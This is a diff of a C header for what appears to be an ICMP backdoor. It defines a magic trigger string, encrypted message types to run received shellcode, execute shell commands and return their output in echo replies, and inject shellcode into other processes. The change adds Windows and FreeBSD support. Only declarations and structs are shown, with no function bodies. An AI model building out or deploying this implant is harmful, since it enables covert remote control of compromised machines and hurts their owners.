@@ -1,37 +1,42 @@
-#define Linux
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/mman.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-#include <sys/stat.h>
-#include <pcap.h>
-#include <netdb.h>
-#include <netinet/ip.h>
-#include <netinet/ip_icmp.h>
-#include <bits/waitflags.h>
 #include <signal.h>
 #include <time.h>
+#include <stdint.h>
 
-#include <hijack.h>
-#include <hijack_func.h>
 
 #define SIZE_ETHERNET   14
 #define STACK_SIZE      16384
 #define MAX_PACKET_SIZE 1024
-#define INTERFACE		"eth0"
-#define MAGIC           	"GOATSE"
-#define REDIRECT		" 2>&1"
+#define INTERFACE		   "em0"
+#define MAGIC           "GOATSE"
+#define REDIRECT		   " 2>&1"
 
-#define MESSAGE_SHELLCODE 		0x01
-#define MESSAGE_COMMAND 		0x02
-#define MESSAGE_REMOTE_SHELLCODE	0x03
+#define MESSAGE_SHELLCODE 		      0x01  // Fork and run the shellcode
+#define MESSAGE_COMMAND 		      0x02  // Run a command and send back the response
+#define MESSAGE_REMOTE_SHELLCODE	   0x04  // Inject shellcode into another process
+#define MESSAGE_WINDOWS_32          0x08  
+#define MESSAGE_LINUX_32            0x10
+#define MESSAGE_FREEBSD_32          0x20
+
+#ifdef __FreeBSD__
+   #define FreeBSD
+#endif
+
+#ifdef __linux__
+   #define Linux
+#endif
+
+#ifdef __MINGW32__
+   #define Windows
+#endif
+
+#ifdef __MINGW64__
+   #define Windows
+#endif
 
 #ifdef DEBUG
 #define DEBUG_WRAP(code) code
@@ -39,26 +44,48 @@
 #define DEBUG_WRAP(code)
 #endif
 
-// Build response packets for sending
-int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size);
 
-// Send response packet
-void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
+#define LOG(level, ...) { fprintf(stderr, "%s: ", level); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
+#define LOG_ERROR(...) { LOG("ERROR", __VA_ARGS__); }
+#define LOG_DEBUG(...) { DEBUG_WRAP(LOG("DEBUG", __VA_ARGS__)); }
 
-// Execute shellcode received from shellcode message
-void run_shellcode(const unsigned char *shellcode, uint32_t size);
+uint32_t decrypt_message(const uint8_t *data, uint8_t *decoded_data, uint32_t len, uint8_t *key);
 
-// Actually run the shellcode
-void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack );
+typedef struct ip_hdr {
+   uint8_t ip_header_len:4;
+   uint8_t ip_version:4;
+   uint8_t ip_tos;
+   uint16_t ip_total_length;
+   uint16_t ip_id;
+   uint8_t ip_frag_offset:5;
+   uint8_t ip_more_fragment:1;
+   uint8_t ip_dont_fragment:1;
+   uint8_t ip_reserved_zero:1;
+   uint8_t ip_frag_offset1;
+   uint8_t ip_ttl;
+   uint8_t ip_protocol;
+   uint16_t ip_checksum;
+   uint32_t ip_srcaddr;
+   uint32_t ip_destaddr;
 
-// Execute system command and send back the results via ICMP echo reply
-void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
+} IPV4_HDR;
 
-// Decrypt/encrypt data using the two byte key (Yay, xor)
-uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);
-
-// Process the received icmp message
-void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
-
-// Inject shellcode into another running process
-int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size);
+typedef struct icmp_hdr {
+  uint8_t type;     /* message type */
+  uint8_t code;     /* type sub-code */
+  uint16_t checksum;
+  union
+  {
+    struct
+    {
+      uint16_t   id;
+      uint16_t   sequence;
+    } echo;       /* echo datagram */
+    uint32_t  gateway; /* gateway address */
+    struct
+    {
+      uint16_t   unused;
+      uint16_t   mtu;
+    } frag;       /* path mtu discovery */
+  } un;
+} ICMP_HDR;
